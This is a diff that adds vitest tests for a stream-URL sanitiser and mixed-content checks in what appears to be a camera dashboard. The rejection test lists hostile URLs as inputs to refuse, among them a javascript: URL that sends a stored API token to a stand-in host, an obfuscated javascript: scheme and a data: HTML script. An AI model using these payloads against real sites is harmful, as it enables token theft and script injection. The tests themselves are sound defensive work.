@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { isMixedContent, safeUrl } from './url'
+import { isMixedContent, safeStreamUrl, safeUrl } from './url'
 
 describe('safeUrl', () => {
   it('allows the schemes a dashboard actually uses', () => {
@@ -62,6 +62,29 @@ describe('safeUrl', () => {
   })
 })
 
+describe('safeStreamUrl', () => {
+  it('takes what a camera streams over, websockets included', () => {
+    for (const url of [
+      'ws://cam.lan:1984/api/ws?src=a',
+      'wss://cam.lan/api/ws',
+      'https://cam.lan/x.m3u8',
+      'http://cam/x.mjpeg',
+      '/snap.jpg'
+    ])
+      expect(safeStreamUrl(url), url).toBe(url)
+  })
+
+  it('refuses anything that could run script, however it is dressed', () => {
+    for (const url of [
+      "javascript:fetch('//x/?'+localStorage['neohab:apiToken'])//a.html",
+      ' jav\u0009ascript:alert(1)//x.m3u8',
+      'data:text/html,<script>alert(1)</script>//a.html',
+      'vbscript:msgbox(1)'
+    ])
+      expect(safeStreamUrl(url), JSON.stringify(url)).toBeNull()
+  })
+})
+
 describe('isMixedContent', () => {
   it('is only ever a question for an https page', () => {
     for (const p of ['http:', 'file:', 'about:']) expect(isMixedContent('http://192.168.1.10:1984/stream', p)).toBe(false)
@@ -70,6 +93,11 @@ describe('isMixedContent', () => {
   it('catches an absolute http address on an https page', () => {
     expect(isMixedContent('http://192.168.1.10:1984/stream', 'https:')).toBe(true)
     expect(isMixedContent('HTTP://cam.lan/x.m3u8', 'https:')).toBe(true)
+  })
+
+  it('catches a plain websocket too, which is how go2rtc and Frigate stream', () => {
+    expect(isMixedContent('ws://192.168.1.10:1984/api/ws?src=door', 'https:')).toBe(true)
+    expect(isMixedContent('wss://cam.lan/api/ws', 'https:')).toBe(false)
   })
 
   it('leaves alone everything the browser will actually load', () => {
